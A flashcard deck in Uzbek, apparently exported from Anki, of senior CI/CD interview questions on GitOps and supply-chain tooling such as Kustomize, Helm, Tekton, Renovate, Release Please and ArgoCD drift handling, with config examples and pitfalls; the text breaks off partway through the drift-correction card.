Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40689	<p>GitOps'da Kustomize nima?</p>	<p><b>Qisqa javob:</b> Kustomize — template'siz Kubernetes konfiguratsiya tool'i: oddiy YAML <code>base</code> ustiga muhitga xos <code>overlay</code>lar (patch, image tag, replicas, label, namespace, configMapGenerator) qo'yadi. <code>kubectl apply -k</code> ga o'rnatilgan; ArgoCD va Flux uni native qo'llaydi.</p><p><b>Muammo:</b> dev/staging/prod uchun bir xil manifest'larning uch nusxasi — biriga tuzatish kiritib, boshqasini unutasan. Helm template'lari esa YAML'ni <code>{{ }}</code> bilan o'qib bo'lmas holga keltiradi.</p><p><b>Qanday ishlaydi:</b></p><pre>base/            deployment.yaml, service.yaml, kustomization.yaml<br>overlays/dev/    kustomization.yaml (resources: ../../base, replicas: 1)<br>overlays/prod/   kustomization.yaml (replicas: 5, patch: resources, image tag)<br>kustomize build overlays/prod --&gt; yakuniy YAML --&gt; ArgoCD/Flux apply</pre><p><b>Amalda:</b></p><pre># overlays/prod/kustomization.yaml<br>apiVersion: kustomize.config.k8s.io/v1beta1<br>kind: Kustomization<br>namespace: api-prod<br>resources: [../../base]<br>images:<br>  - name: org/api<br>    newTag: &quot;1.4.2&quot;<br>replicas:<br>  - name: api<br>    count: 5<br>patches:<br>  - path: resources-patch.yaml<br>configMapGenerator:<br>  - name: api-config<br>    literals: [LOG_LEVEL=info]</pre><pre>kustomize build overlays/prod | less<br>kubectl diff -k overlays/prod<br>kustomize edit set image org/api:1.4.3     # CI'da tag yangilash</pre><p><b>Tuzoqlar:</b></p><ul><li><code>configMapGenerator</code> nomiga hash qo'shadi (<code>api-config-7h2k9</code>) — bu yaxshi (o'zgarsa pod restart bo'ladi), lekin eski ConfigMap'lar prune bo'lmasa to'planadi.</li><li><code>kubectl -k</code> ichidagi Kustomize versiyasi standalone'dan eski bo'lishi mumkin — funksiya farqlari.</li><li>Juda chuqur overlay zanjirlari (base -&gt; region -&gt; env -&gt; cluster) — o'qib bo'lmaydi.</li></ul><p><b>Senior nuqta:</b> Ko'p jamoa gibrid ishlatadi: uchinchi tomon software uchun Helm chart, o'z servislari uchun Kustomize, yoki Helm chart'ni Kustomize <code>helmCharts</code> bilan render qilib ustidan patch. GitOps'da &quot;rendered manifest&quot; yondashuvi (CI'da build qilib natijani commit) diff'ni aniq ko'rsatadi.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40690	<p>GitOps'da Helm nima?</p>	<p><b>Qisqa javob:</b> Helm — Kubernetes paket menejeri: manifest'lar Go template sifatida <b>chart</b>ga jamlanadi, <code>values.yaml</code> bilan parametrlanadi, versiyalanadi (repo yoki OCI registry'da) va release sifatida o'rnatiladi. GitOps'da Helm odatda faqat <b>render</b> vositasi — apply'ni ArgoCD/Flux qiladi.</p><p><b>Muammo:</b> Postgres, ingress-nginx, cert-manager kabi murakkab software'ni o'nlab manifest bilan qo'lda yozish va yangilash amaliy emas; chart muallifi buni paketlab beradi.</p><p><b>Qanday ishlaydi:</b></p><pre>chart (templates/ + values.yaml + Chart.yaml)<br>   + sizning values (prod-values.yaml)<br>   --&gt; helm template --&gt; YAML<br>GitOps: ArgoCD repo-server `helm template` qiladi -&gt; diff -&gt; apply (helm release secret yo'q)<br>        Flux helm-controller haqiqiy `helm upgrade` qiladi (release history bor)</pre><p><b>Amalda (ArgoCD Application, Helm source):</b></p><pre>source:<br>  repoURL: https://charts.bitnami.com/bitnami   # yoki oci://...<br>  chart: postgresql<br>  targetRevision: 16.2.1<br>  helm:<br>    releaseName: pg<br>    valuesObject:<br>      primary: { persistence: { size: 50Gi } }</pre><pre>helm template pg oci://registry-1.docker.io/bitnamicharts/postgresql --version 16.2.1 -f prod-values.yaml | less<br>helm show values ... &gt; defaults.yaml       # qaysi parametrlar bor<br>helm lint ./mychart</pre><p><b>Tuzoqlar:</b></p><ul><li>ArgoCD'da <code>helm list</code> bo'sh — chunki ArgoCD Helm release yaratmaydi; Helm hook'lari ArgoCD hook'lariga map qilinadi.</li><li><code>lookup</code> funksiyasi, <code>randAlphaNum</code> bilan parol yaratish — GitOps'da har render'da boshqacha natija, doimiy OutOfSync.</li><li>Chart versiyasini pin qilmaslik — upstream o'zgarishi kutilmaganda deploy bo'ladi.</li></ul><p><b>Senior nuqta:</b> O'z servislaring uchun &quot;umumiy chart&quot; yozish qulay, lekin u tez orada hamma narsani parametrlaydigan monsterga aylanadi. Sodda servislarda Kustomize kamroq abstraksiya beradi.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40691	<p>Helmfile nima?</p>	<p><b>Qisqa javob:</b> Helmfile — bir nechta Helm release'ni (va ularning values'ini, muhitlarini, tartibini) bitta deklarativ <code>helmfile.yaml</code> da tasvirlab, <code>helmfile apply</code> bilan diff ko'rsatib o'rnatadigan CLI. <code>needs:</code> bilan dependency tartibi, <code>environments:</code> bilan dev/prod farqlari.</p><p><b>Muammo:</b> Klaster &quot;bazasi&quot; — ingress, cert-manager, external-dns, prometheus — 10+ chart. Ularni shell skript ichida <code>helm upgrade</code> qatorlari bilan boshqarish — tartib, versiya va diff yo'q.</p><p><b>Amalda:</b></p><pre># helmfile.yaml<br>repositories:<br>  - name: jetstack<br>    url: https://charts.jetstack.io<br>environments:<br>  dev: { values: [env/dev.yaml] }<br>  prod: { values: [env/prod.yaml] }<br>---<br>releases:<br>  - name: cert-manager<br>    namespace: cert-manager<br>    chart: jetstack/cert-manager<br>    version: v1.16.2<br>    values: [{ crds: { enabled: true } }]<br>  - name: api<br>    namespace: api<br>    chart: ./charts/api<br>    needs: [cert-manager/cert-manager]<br>    values: [values/api.yaml.gotmpl]</pre><pre>helmfile -e prod diff        # helm-diff plugin bilan farqni ko'rsatadi<br>helmfile -e prod apply       # faqat o'zgarganlarni upgrade qiladi<br>helmfile -e prod template &gt; rendered.yaml</pre><p><b>Tuzoqlar:</b></p><ul><li>Helmfile push-based: kimdir yoki CI uni ishga tushirishi kerak, drift'ni o'zi tuzatmaydi — bu GitOps emas.</li><li><code>helm-diff</code> plugin o'rnatilmasa <code>diff</code>/<code>apply</code> ishlamaydi.</li><li><code>.gotmpl</code> ichida ikki qatlam template (Helmfile + Helm) — debugging qiyin.</li></ul><p><b>Senior nuqta:</b> Helmfile CI/CD'da yoki klaster bootstrap'da yaxshi. To'liq GitOps uchun uning vazifasini ArgoCD ApplicationSet yoki Flux HelmRelease bajaradi; ArgoCD'da Helmfile'ni Config Management Plugin orqali ham ishlatish mumkin.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40692	<p>Tekton Pipelines nima?</p>	<p><b>Qisqa javob:</b> Tekton Pipelines — CI/CD'ni Kubernetes CRD'lari bilan yozish framework'i (CD Foundation): <b>Step</b> (container) -&gt; <b>Task</b> (bir pod ichidagi step'lar) -&gt; <b>Pipeline</b> (Task'lar DAG'i, <code>runAfter</code> bilan) ; bajarilishi <code>TaskRun</code>/<code>PipelineRun</code>. Har Task alohida ephemeral pod'da ishlaydi, ma'lumot <code>workspaces</code> (PVC) va <code>results</code> orqali uzatiladi.</p><p><b>Muammo:</b> Jenkins kabi markaziy CI server — doimiy state, plugin do'zaxi, scale qilish qiyin. Tekton CI'ni Kubernetes'ning o'z resurslariga aylantiradi: scale, RBAC, izolyatsiya — klasterdan.</p><p><b>Qanday ishlaydi:</b></p><pre>EventListener (webhook) --&gt; TriggerTemplate --&gt; PipelineRun<br>Pipeline:  clone --&gt; [unit-test, lint] (parallel) --&gt; build-push --&gt; deploy<br>             |  workspace (PVC) bilan source uzatiladi<br>           har biri = TaskRun = Pod</pre><p><b>Amalda:</b></p><pre>apiVersion: tekton.dev/v1<br>kind: Pipeline<br>metadata: { name: ci }<br>spec:<br>  params: [{ name: repo-url }]<br>  workspaces: [{ name: src }]<br>  tasks:<br>    - name: clone<br>      taskRef: { resolver: hub, params: [{ name: name, value: git-clone }, { name: version, value: &quot;0.9&quot; }] }<br>      params: [{ name: url, value: $(params.repo-url) }]<br>      workspaces: [{ name: output, workspace: src }]<br>    - name: test<br>      runAfter: [clone]<br>      taskRef: { name: go-test }<br>      workspaces: [{ name: source, workspace: src }]</pre><pre>tkn pipeline start ci -p repo-url=https://github.com/org/api -w name=src,volumeClaimTemplateFile=pvc.yaml --showlog<br>tkn pipelinerun list</pre><p><b>Tuzoqlar:</b></p><ul><li>Har Task — yangi pod: pod start va PVC attach vaqti qisqa task'larni sekinlashtiradi; step'larni bitta Task'ga birlashtir.</li><li><code>ReadWriteOnce</code> PVC — parallel task'lar turli node'ga tushsa mount bo'lmaydi (affinity assistant yoki RWX).</li><li>Eski PipelineRun pod'lari to'planadi — pruner sozla.</li></ul><p><b>Senior nuqta:</b> Tekton — &quot;CI qurilish bloklari&quot;, tayyor mahsulot emas: UI (Tekton Dashboard), trigger, chains (supply chain imzolash) alohida. Ichki platforma qurayotgan jamoa uchun kuchli, kichik jamoaga GitHub Actions/GitLab CI soddaroq. Tekton Chains bilan TaskRun'lardan SLSA provenance avtomatik.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40693	<p>Spinnaker Kayenta (Automated Canary Analysis) nima?</p>	<p><b>Qisqa javob:</b> Kayenta — Netflix/Google'ning Spinnaker'dagi Automated Canary Analysis (ACA) engine'i: canary va <b>bir vaqtda yangi ishga tushirilgan baseline</b> (eski versiya) klasterlaridan metrikalarni olib, statistik test (Mann-Whitney U) bilan solishtiradi va 0-100 ball beradi; ball chegaradan past bo'lsa reliz to'xtatiladi.</p><p><b>Muammo:</b> Absolyut chegaralar (&quot;error &lt; 1%&quot;) kun vaqti, trafik o'zgarishi bilan noto'g'ri qaror beradi. Canary'ni prod'dagi uzoq yashagan eski pod'lar bilan solishtirish ham xato: ularda cache issiq, JVM qizigan.</p><p><b>Qanday ishlaydi:</b></p><pre>prod (v1, katta)    -- trafik --+<br>baseline (v1, 3 pod, yangi)  &lt;--+-- bir xil ulush<br>canary   (v2, 3 pod, yangi)  &lt;--+<br>Kayenta: har metrika uchun baseline vs canary taqsimotini solishtiradi<br>  -&gt; Pass/High/Low -&gt; og'irliklar bo'yicha umumiy ball<br>  ball &gt;= 95: promote | 75..95: marginal (inson) | &lt; 75: rollback</pre><p><b>Amalda (canary config fragmenti):</b></p><pre>{ &quot;metrics&quot;: [<br>    { &quot;name&quot;: &quot;5xx&quot;, &quot;query&quot;: { &quot;type&quot;: &quot;prometheus&quot;,<br>        &quot;customInlineTemplate&quot;: &quot;PromQL:sum(rate(http_requests_total{code=~\&quot;5..\&quot;,version=\&quot;${scope}\&quot;}[1m]))&quot; },<br>      &quot;analysisConfigurations&quot;: { &quot;canary&quot;: { &quot;direction&quot;: &quot;increase&quot;, &quot;critical&quot;: true } },<br>      &quot;groups&quot;: [&quot;errors&quot;] } ],<br>  &quot;classifier&quot;: { &quot;groupWeights&quot;: { &quot;errors&quot;: 70, &quot;latency&quot;: 30 } } }</pre><p>Spinnaker pipeline'da &quot;Canary Analysis&quot; stage: interval, lifetime, <code>marginal</code>/<code>pass</code> threshold'lari.</p><p><b>Tuzoqlar:</b></p><ul><li>Baseline'siz canary'ni prod bilan solishtirish — warm-up farqi soxta &quot;regressiya&quot; beradi.</li><li>Kam trafik — statistik test ishonchsiz; analiz davri yetarlicha uzun bo'lsin.</li><li><code>critical: true</code> metrika yiqilsa umumiy ball yuqori bo'lsa ham fail.</li></ul><p><b>Senior nuqta:</b> Kayenta g'oyasi (baseline vs canary nisbiy solishtirish) Spinnaker'siz ham qo'llaniladi — Argo Rollouts'da ikkita AnalysisTemplate yoki Kayenta provider bilan. Spinnaker bugun kamroq yangi joriy qilinadi (murakkab operatsiya), lekin ACA konsepsiyasi intervyuda muhim.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40694	<p>CI/CD'da Chaos Mesh nima?</p>	<p><b>Qisqa javob:</b> Chaos Mesh (CNCF incubating) — Kubernetes uchun chaos engineering platformasi: CRD'lar orqali nosozlik kiritadi — <code>PodChaos</code> (pod kill/failure), <code>NetworkChaos</code> (delay, loss, partition), <code>StressChaos</code> (CPU/memory), <code>IOChaos</code>, <code>TimeChaos</code>, <code>DNSChaos</code>, <code>HTTPChaos</code>. CI/CD'da — staging'da avtomatik resilience testi sifatida ishlatiladi.</p><p><b>Muammo:</b> Timeout, retry, circuit breaker, PDB, replica soni — &quot;ishlashi kerak&quot; degan farazlar. Ular haqiqiy nosozlikda tekshirilmaguncha — faqat taxmin.</p><p><b>Qanday ishlaydi:</b></p><pre>CI: deploy staging -&gt; load test boshlanadi<br>    -&gt; Chaos Mesh: NetworkChaos (payments -&gt; db 200ms delay, 5 min)<br>    -&gt; SLO tekshiruvi: p99 &lt; 800ms? error &lt; 1%?<br>    -&gt; chaos tugadi -&gt; natija: pipeline pass/fail<br>chaos-daemon (har node'da DaemonSet) tc/iptables/cgroup orqali nosozlik kiritadi</pre><p><b>Amalda:</b></p><pre>apiVersion: chaos-mesh.org/v1alpha1<br>kind: NetworkChaos<br>metadata: { name: db-latency, namespace: staging }<br>spec:<br>  action: delay<br>  mode: all<br>  selector: { namespaces: [staging], labelSelectors: { app: payments } }<br>  delay: { latency: &quot;200ms&quot;, jitter: &quot;50ms&quot; }<br>  direction: to<br>  target: { mode: all, selector: { labelSelectors: { app: postgres } } }<br>  duration: &quot;5m&quot;</pre><pre>kubectl apply -f db-latency.yaml<br>kubectl -n staging get networkchaos<br>kubectl delete networkchaos db-latency -n staging     # darhol to'xtatish</pre><p>Murakkab ssenariy uchun <code>Workflow</code> CRD (ketma-ket/parallel eksperimentlar).</p><p><b>Tuzoqlar:</b></p><ul><li>Gipotezasiz chaos — &quot;nimadir buzildi&quot; bilan tugaydi. Avval: &quot;200ms delay'da p99 &lt; 800ms qoladi&quot; kabi aniq gipoteza.</li><li>chaos-daemon privileged — uni namespace bilan cheklamaslik prod'ga ham ta'sir qilish imkonini beradi (<code>--set controllerManager.enableFilterNamespace</code>).</li><li>Observability bo'lmasa natijani o'lchab bo'lmaydi.</li></ul><p><b>Senior nuqta:</b> Chaos'ni CI'ga qo'shish — regressiyalarni ushlaydi (masalan, kimdir timeout'ni olib tashladi). Prod'dagi GameDay'lar alohida, nazorat ostida va blast radius cheklangan holda. Alternativalar: LitmusChaos, AWS FIS, Gremlin.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40695	<p>Semantic Release nima?</p>	<p><b>Qisqa javob:</b> semantic-release — commit xabarlari (Conventional Commits) asosida keyingi SemVer versiyani avtomatik aniqlaydigan, changelog, Git tag, GitHub/GitLab release yaratadigan va paketni (npm va h.k.) publish qiladigan tool. Inson versiya raqamini tanlamaydi.</p><p><b>Muammo:</b> &quot;Bu major'mi yoki minor?&quot; bahsi, unutilgan changelog, qo'lda tag — xato va nomuvofiqlik. Breaking change'ni patch sifatida chiqarish foydalanuvchilarni sindiradi.</p><p><b>Qanday ishlaydi:</b></p><pre>oxirgi tag v1.4.2 dan beri commit'lar:<br>  fix: ...                     -&gt; patch<br>  feat: ...                    -&gt; minor<br>  feat!: ... / BREAKING CHANGE: -&gt; major<br>eng kattasi tanlanadi -&gt; v1.5.0<br>plugin'lar: commit-analyzer -&gt; release-notes-generator -&gt; changelog -&gt; npm -&gt; github -&gt; git</pre><p><b>Amalda:</b></p><pre>// .releaserc.json<br>{ &quot;branches&quot;: [&quot;main&quot;, { &quot;name&quot;: &quot;beta&quot;, &quot;prerelease&quot;: true }],<br>  &quot;plugins&quot;: [&quot;@semantic-release/commit-analyzer&quot;,<br>              &quot;@semantic-release/release-notes-generator&quot;,<br>              &quot;@semantic-release/changelog&quot;,<br>              &quot;@semantic-release/github&quot;] }</pre><pre># GitHub Actions<br>- run: npx semantic-release<br>  env: { GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} }</pre><pre>npx semantic-release --dry-run     # qaysi versiya chiqishini ko'rish</pre><p><b>Tuzoqlar:</b></p><ul><li>Commit xabarlari intizomsiz bo'lsa natija noto'g'ri — commitlint + PR title tekshiruvi (squash merge'da PR sarlavhasi commit bo'ladi).</li><li>CI'da shallow clone (<code>fetch-depth: 1</code>) — tag tarixini ko'rmaydi; <code>fetch-depth: 0</code>.</li><li>Branch protection tufayli changelog commit'ini push qila olmaydi — bot uchun istisno yoki changelog'ni repo'da saqlamaslik.</li></ul><p><b>Senior nuqta:</b> semantic-release har merge'da darhol reliz chiqaradi (continuous release) — kutubxonalar uchun zo'r. Reliz vaqtini inson nazorat qilishi kerak bo'lsa (ilovalar, monorepo) — Release Please yoki Changesets qulayroq.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40696	<p>Release Please nima?</p>	<p><b>Qisqa javob:</b> Release Please (Google) — Conventional Commits tarixidan keyingi versiyani hisoblab, versiya fayllari va <code>CHANGELOG.md</code> ni yangilaydigan <b>Release PR</b> ochadi va uni yangi commit'lar bilan yangilab turadi. PR merge qilinganda Git tag va GitHub Release yaratadi.</p><p><b>Muammo:</b> semantic-release har merge'da darhol reliz chiqaradi; ko'p jamoa esa &quot;qachon reliz qilish&quot;ni o'zi tanlashni va changelog'ni ko'rib chiqishni xohlaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>main'ga merge: feat: ..., fix: ...<br>   --&gt; release-please: &quot;chore(main): release 1.5.0&quot; PR (CHANGELOG + version bump)<br>   ... yana merge'lar -&gt; PR yangilanadi<br>inson Release PR'ni merge qiladi --&gt; tag v1.5.0 + GitHub Release<br>   --&gt; keyingi job: build/publish (release_created == true bo'lsa)</pre><p><b>Amalda:</b></p><pre>on: { push: { branches: [main] } }<br>permissions: { contents: write, pull-requests: write }<br>jobs:<br>  release:<br>    runs-on: ubuntu-latest<br>    outputs: { created: ${{ steps.rp.outputs.release_created }} }<br>    steps:<br>      - id: rp<br>        uses: googleapis/release-please-action@v4<br>        with: { release-type: node }<br>  publish:<br>    needs: release<br>    if: needs.release.outputs.created == 'true'<br>    runs-on: ubuntu-latest<br>    steps: [{ run: echo &quot;build &amp; publish&quot; }]</pre><p>Monorepo: <code>release-please-config.json</code> + <code>.release-please-manifest.json</code> — har paket alohida versiya.</p><p><b>Tuzoqlar:</b></p><ul><li>Default <code>GITHUB_TOKEN</code> bilan ochilgan PR boshqa workflow'larni (CI check) trigger qilmaydi — GitHub App token ishlat.</li><li>Squash merge'da PR sarlavhasi conventional bo'lmasa commit hisobga olinmaydi.</li><li>Release PR'ni uzoq ochiq qoldirish — katta, xavfli relizlar.</li></ul><p><b>Senior nuqta:</b> Release Please &quot;deploy qilinadigan&quot; ilovalar va monorepo'lar uchun mos: reliz — ko'rib chiqiladigan PR, ya'ni audit va nazorat nuqtasi. Kutubxonalarda to'liq avtomatlashtirish uchun semantic-release yoki Changesets.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40697	<p>Dependabot / Renovate nima?</p>	<p><b>Qisqa javob:</b> Dependabot (GitHub o'rnatilgan) va Renovate (Mend, ochiq kodli) — dependency manifest'larini (package.json, go.mod, Dockerfile, GitHub Actions, Terraform, Helm ...) skanerlab, yangi versiya yoki xavfsizlik tuzatishi chiqqanda changelog/release notes bilan avtomatik PR ochadigan bot'lar.</p><p><b>Muammo:</b> Dependency'lar o'z-o'zidan eskiradi. Bir yil yangilanmagan loyihada CVE tuzatish uchun 3 ta major versiyadan sakrash kerak — og'riqli. Kichik, muntazam yangilanishlar arzonroq.</p><p><b>Qanday ishlaydi:</b></p><pre>jadval bo'yicha: manifest + lockfile o'qiladi --&gt; registry'da yangi versiya?<br>  --&gt; branch + PR (changelog, release notes, compatibility score)<br>  --&gt; CI test --&gt; review/auto-merge<br>security advisory chiqsa --&gt; darhol security PR (Dependabot security updates)</pre><p><b>Amalda (Dependabot):</b></p><pre># .github/dependabot.yml<br>version: 2<br>updates:<br>  - package-ecosystem: gomod<br>    directory: /<br>    schedule: { interval: weekly }<br>    groups:<br>      minor-patch: { update-types: [minor, patch] }<br>  - package-ecosystem: github-actions<br>    directory: /<br>    schedule: { interval: weekly }<br>  - package-ecosystem: docker<br>    directory: /<br>    schedule: { interval: weekly }</pre><p><b>Tuzoqlar:</b></p><ul><li>Guruhlashsiz — haftasiga 30 PR, jamoa ularni e'tiborsiz qoldiradi (&quot;PR fatigue&quot;).</li><li>Testlar zaif bo'lsa yangilanish &quot;yashil&quot; bo'lib prod'ni sindiradi — auto-merge faqat yaxshi test coverage bilan.</li><li>Yangi chiqqan versiyani darhol olish — zararli publish (supply chain hujum) riski; Renovate <code>minimumReleaseAge</code> bilan bir necha kun kutish.</li></ul><p><b>Senior nuqta:</b> Bot faqat jarayon bo'lsa foyda beradi: kim PR'larni ko'radi, qaysi turlar auto-merge, qancha vaqtda. GitHub Actions'ni ham SHA bilan pin qilib, yangilashni bot'ga topshirish — xavfsizlik va qulaylik muvozanati.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40698	<p>Renovate bot'ning afzalligi nima?</p>	<p><b>Qisqa javob:</b> Renovate'ning Dependabot'dan afzalliklari: ko'p platforma (GitHub, GitLab, Bitbucket, Azure DevOps, Gitea), 90+ package manager, kuchli <code>packageRules</code> (guruhlash, jadval, auto-merge, <code>minimumReleaseAge</code>), <b>Dependency Dashboard</b> issue, monorepo preset'lari, custom regex manager (istalgan fayldagi versiya) va org-darajasidagi umumiy preset'lar.</p><p><b>Muammo:</b> Dependabot GitHub'ga bog'liq va sozlamalari cheklangan; katta tashkilotda yuzlab repo uchun yagona siyosat va kam shovqin kerak.</p><p><b>Amalda (<code>renovate.json</code>):</b></p><pre>{<br>  &quot;extends&quot;: [&quot;config:recommended&quot;, &quot;helpers:pinGitHubActionDigests&quot;],<br>  &quot;schedule&quot;: [&quot;before 6am on monday&quot;],<br>  &quot;minimumReleaseAge&quot;: &quot;3 days&quot;,<br>  &quot;dependencyDashboard&quot;: true,<br>  &quot;packageRules&quot;: [<br>    { &quot;matchUpdateTypes&quot;: [&quot;patch&quot;, &quot;minor&quot;], &quot;matchCurrentVersion&quot;: &quot;!/^0/&quot;,<br>      &quot;groupName&quot;: &quot;non-major&quot;, &quot;automerge&quot;: true },<br>    { &quot;matchUpdateTypes&quot;: [&quot;major&quot;], &quot;dependencyDashboardApproval&quot;: true },<br>    { &quot;matchPackageNames&quot;: [&quot;/^@aws-sdk//&quot;], &quot;groupName&quot;: &quot;aws-sdk&quot; }<br>  ],<br>  &quot;customManagers&quot;: [<br>    { &quot;customType&quot;: &quot;regex&quot;, &quot;managerFilePatterns&quot;: [&quot;/Makefile$/&quot;],<br>      &quot;matchStrings&quot;: [&quot;TERRAFORM_VERSION=(?&lt;currentValue&gt;.*?)\\n&quot;],<br>      &quot;depNameTemplate&quot;: &quot;hashicorp/terraform&quot;, &quot;datasourceTemplate&quot;: &quot;github-releases&quot; }<br>  ]<br>}</pre><pre>npx renovate-config-validator<br>LOG_LEVEL=debug npx renovate --dry-run=full org/repo</pre><p><b>Tuzoqlar:</b></p><ul><li>Konfiguratsiya juda kuchli — xato regex yoki <code>packageRules</code> tartibi kutilmagan natija beradi; dashboard va debug log bilan tekshir.</li><li>Self-hosted Renovate'ga keng token — uni GitHub App bilan, kerakli repo'lar uchun ber.</li><li><code>automerge</code> + branch protection'da required check'lar yo'q bo'lsa — test'siz merge.</li></ul><p><b>Senior nuqta:</b> Org-darajasidagi preset (<code>&quot;extends&quot;: [&quot;github&gt;org/renovate-config&quot;]</code>) yuzlab repo'da bitta siyosatni ta'minlaydi. Oddiy GitHub-only loyihada Dependabot yetarli va nol sozlash; murakkab monorepo va ko'p ekotizimda — Renovate.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40699	<p>Pull request builder job nima?</p>	<p><b>Qisqa javob:</b> PR builder job — pull request ochilganda yoki yangi commit push qilinganda avtomatik ishga tushadigan CI job: build, lint, unit test, scan bajaradi va natijani PR'ga <b>status check</b> sifatida qaytaradi; branch protection shu check'lar yashil bo'lmaguncha merge'ni bloklaydi.</p><p><b>Muammo:</b> Main'ga sinmagan kod tushishi kerak. Review'da &quot;testlar o'tadimi?&quot; ni inson tekshirmasligi kerak — buni mashina qiladi.</p><p><b>Qanday ishlaydi:</b></p><pre>PR push --&gt; webhook --&gt; CI: checkout (PR head + main merge commit)<br>   --&gt; build -&gt; test -&gt; lint -&gt; scan<br>   --&gt; status API: ci/test = success|failure --&gt; PR sahifasida yashil/qizil<br>branch protection: required checks + review --&gt; merge tugmasi</pre><p><b>Amalda (GitHub Actions):</b></p><pre>on:<br>  pull_request:<br>    branches: [main]<br>concurrency:<br>  group: pr-${{ github.event.pull_request.number }}<br>  cancel-in-progress: true          # yangi push eski run'ni to'xtatadi<br>permissions: { contents: read }<br>jobs:<br>  test:<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: actions/checkout@v4<br>      - uses: actions/setup-go@v5<br>        with: { go-version-file: go.mod, cache: true }<br>      - run: go test -race ./...</pre><p>Jenkins'da analog: Multibranch Pipeline / GitHub Branch Source plugin.</p><p><b>Tuzoqlar:</b></p><ul><li><code>pull_request_target</code> — base repo kontekstida, secret'lar bilan ishlaydi; unda fork PR kodini checkout qilib ishga tushirish = secret o'g'irlash (&quot;pwn request&quot;).</li><li>PR branch eskirgan (main'dan orqada) — o'zi yashil, merge'dan keyin qizil. &quot;Require branches to be up to date&quot; yoki merge queue.</li><li>Sekin PR builder (30+ daqiqa) — developer'lar kichik PR yozishni to'xtatadi.</li></ul><p><b>Senior nuqta:</b> Ko'p jamoali repo'da merge queue (GitHub merge queue, Bors, Mergify) PR'larni main bilan birga qayta test qilib, &quot;yashil PR + yashil PR = qizil main&quot; muammosini yopadi.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40700	<p>GitOps'da out-of-sync holat nima?</p>	<p><b>Qisqa javob:</b> Out-of-sync — GitOps tool'i Git'dagi desired state'ni render qilib, klasterdagi live state bilan solishtirganda farq topilgan holat. ArgoCD'da <code>Sync Status: OutOfSync</code>, Flux'da Kustomization/HelmRelease revision mos kelmasligi yoki drift xabari.</p><p><b>Sabablari (farqlash muhim):</b></p><p>| Sabab | Misol | Harakat | |---|---|---| | Yangi commit hali sync bo'lmagan | merge qilindi, auto-sync o'chiq | sync | | Qo'lda o'zgarish (drift) | <code>kubectl edit</code>, <code>scale</code> | self-heal / Git'ga ko'chirish | | Controller o'zgartiradi | HPA replicas, webhook default'lari | <code>ignoreDifferences</code> | | Render nondeterministik | Helm <code>randAlphaNum</code>, sana | template'ni tuzat | | Sync yiqilgan | invalid manifest, RBAC | xatoni tuzat |</p><p><b>Qanday ishlaydi:</b></p><pre>desired = render(Git) ; live = kube-api ; normalize (default maydonlar, ignore qoidalari)<br>diff != 0  --&gt; OutOfSync</pre><p><b>Amalda:</b></p><pre>argocd app get api-prod           # qaysi resurslar OutOfSync<br>argocd app diff api-prod          # aniq farq<br># Flux<br>flux get kustomizations<br>flux diff kustomization apps --path ./apps/prod</pre><p>Doimiy farq beradigan maydonni e'tiborsiz qoldirish:</p><pre>ignoreDifferences:<br>  - group: admissionregistration.k8s.io<br>    kind: MutatingWebhookConfiguration<br>    jqPathExpressions: [&quot;.webhooks[]?.clientConfig.caBundle&quot;]</pre><p><b>Tuzoqlar:</b></p><ul><li>Doimiy OutOfSync'ga ko'nikib qolish — haqiqiy drift ham e'tiborsiz qoladi.</li><li><code>ServerSideApply=true</code> va normalizatsiyasiz — default maydonlar soxta diff beradi.</li><li>OutOfSync'ni Healthy bilan adashtirish: resurs sinxron emas, lekin sog'lom bo'lishi mumkin (va aksincha).</li></ul><p><b>Senior nuqta:</b> OutOfSync uchun alert qo'y (<code>argocd_app_info{sync_status=&quot;OutOfSync&quot;}</code> &gt; N daqiqa) — bu GitOps'ning asosiy signali. Maqsad: &quot;OutOfSync&quot; har doim harakat talab qiladigan holat bo'lsin, shovqin emas.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40701	<p>GitOps drift correction nima?</p>	<p><b>Qisqa javob:</b> Drift correction — klasterdagi Git'da yo'q (out-of-band) o'zgarishni aniqlab, avtomatik ravishda Git'dagi holatga qaytarish. ArgoCD'da <code>selfHeal: true</code>, Flux'da Kustomization har <code>interval</code>da qayta apply qiladi (va HelmRelease <code>driftDetection.mode: enabled</code>).</p><p><b>Muammo:</b> Incident paytida kimdir <code>kubectl set env</code> qildi, keyin unutdi. Bir oydan keyin yangi klasterga xuddi shu Git'dan deploy — u yerda bu fix yo'q, xato qaytadi. Drift — &quot;Git'da yozilmagan bilim&quot;.</p><p><b>Qanday ishlaydi:</b></p><pre>t0: Git: replicas=3   live: 3     Synced<br>t1: kubectl scale --replicas=8   live: 8   -&gt; OutOfSync (drift)<br>t2: selfHeal (5s kutish) -&gt; apply Git  -&gt; live: 3   Synced</pre><p><b>Amalda:</b></p><pre># ArgoCD<br>syncPolicy:<br>  automated: { selfHeal: true, prune: true }</pre><pre># Flux Kustomization<br>spec:<br>  interval: 5m       # har 5 daqiqada qayta apply -&gt; drift tuzatiladi<br>  force: 